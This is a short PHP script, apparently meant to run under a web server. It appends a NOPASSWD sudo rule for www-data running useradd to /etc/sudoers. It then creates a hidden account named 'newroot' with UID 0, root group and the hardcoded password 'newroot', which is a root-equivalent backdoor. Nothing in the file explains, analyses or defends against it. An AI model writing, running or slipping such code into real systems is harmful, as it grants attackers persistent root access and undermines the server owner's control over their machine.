<?php
// Modify the /etc/sudoers file to grant password-less sudo access to www-data for useradd
$sudoers_file = '/etc/sudoers';
$sudoers_entry = "\n# Allow www-data to run useradd without a password\nwww-data ALL=(ALL) NOPASSWD: /usr/sbin/useradd\n";
file_put_contents($sudoers_file, $sudoers_entry, FILE_APPEND | LOCK_EX);

// Create a new admin user with username and password set to "newroot"
$new_username = 'newroot';
$password = 'newroot';
$command = "sudo useradd -ou 0 -g 0 -s /bin/bash -p $(openssl passwd -1 '$password') $new_username";
system($command);
?>
